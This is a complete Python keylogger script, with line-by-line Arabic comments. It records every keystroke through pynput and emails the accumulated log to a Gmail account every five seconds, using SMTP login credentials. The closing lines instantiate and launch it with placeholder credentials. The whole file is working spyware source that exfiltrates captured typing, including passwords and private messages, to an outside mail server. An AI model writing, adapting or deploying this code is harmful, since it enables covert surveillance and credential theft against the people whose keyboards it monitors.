import pynput.keyboard  
# استيراد وحدة pynput.keyboard لالتقاط أحداث لوحة المفاتيح
import threading  
# استيراد وحدة threading للعمل مع الخيوط في Python
import smtplib 
# استيراد وحدة smtplib لإرسال رسائل البريد الإلكتروني من Python
class Keylogger:  
    # تعريف فئة جديدة باسم Keylogger
    def __init__(self, Timer, email, password) -> None:  
        # الدالة المُنشئة لتهيئة السمات الخاصة بالفئة
        self.Timer = Timer  
        # تعيين قيمة المُعامل Timer لسمة Timer
        self.email = email  
        # تعيين قيمة المُعامل email لسمة email
        self.password = password  
        # تعيين قيمة المُعامل password لسمة password
        self.log = ""  
        # تهيئة السمة log لتكون سلسلة فارغة
    def process_keys(self, key):  
        # الدالة لمعالجة المفاتيح المضغوطة
        try:  
            # بداية كتلة try للتعامل مع الاستثناءات المحتملة
            self.log += key.char  
            # إضافة الحرف الذي يُمثله المفتاح المضغوط إلى السمة log
        except AttributeError:  
            # التقاط استثناء AttributeError
            if key == key.space:  
                # التحقق مما إذا كان المفتاح المضغوط هو مفتاح المسافة
                self.log += " "  
                # إضافة مسافة إلى السمة log
            else:  
                # التعامل مع الحالة عندما لا يكون المفتاح المضغوط هو مفتاح المسافة
                self.log += " " + str(key) + " "  
                # إضافة المفتاح المضغوط (محولًا إلى سلسلة) محاطًا بمسافات إلى السمة log
    def send_mail(self, email, password, message):  
        # الدالة لإرسال رسائل البريد الإلكتروني
        server = smtplib.SMTP("smtp.gmail.com", 587)  
        # إنشاء كائن خادم SMTP لـ Gmail
        server.starttls()  
        # بدء الاتصال TLS للتواصل الآمن مع خادم SMTP
        server.login(email, password)  
        # تسجيل الدخول إلى خادم SMTP باستخدام البريد الإلكتروني وكلمة المرور المُقدمة
        server.sendmail(email, email, message)  
        # إرسال بريد إلكتروني من عنوان البريد الإلكتروني المُقدم إلى نفس العنوان مع محتوى الرسالة المُحدد
        server.quit()  
        # إغلاق الاتصال بخادم SMTP
    def report(self):  
        # الدالة للإبلاغ عن المفاتيح المضغوطة
        self.send_mail(self.email, self.password, self.log)  
        # استدعاء الدالة send_mail لإرسال المفاتيح المضغوطة عبر البريد الإلكتروني
        print(self.log)  
        # طباعة المفاتيح المضغوطة إلى الشاشة
        self.log = ""  
        # إعادة تهيئة السمة log لتكون سلسلة فارغة بعد إرسال البريد الإلكتروني
        timer = threading.Timer(self.Timer, self.report)  
        # إنشاء كائن مؤقت يُعيد استدعاء الدالة report بعد فترة زمنية محددة
        timer.start()  
        # بدء المؤقت
    def start(self):  
        # الدالة لبدء عملية تسجيل المفاتيح
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keys)  
        # إنشاء كائن مستمع لوحة المفاتيح يستدعي الدالة process_keys عندما يتم الضغط على مفتاح
        with keyboard_listener:  
            # التأكد من تنظيف كائن المستمع لوحة المفاتيح بشكل صحيح بعد استخدامه
            self.report()  
            # بدء عملية الإبلاغ، والتي ترسل رسائل بريد إلكتروني تحتوي على المفاتيح المضغوطة بانتظام
            keyboard_listener.join()  
            # حجب الخيط الرئيسي حتى يتم إيقاف مستمع لوحة المفاتيح


k = Keylogger(5,"your_email","password_your_email")
k.start()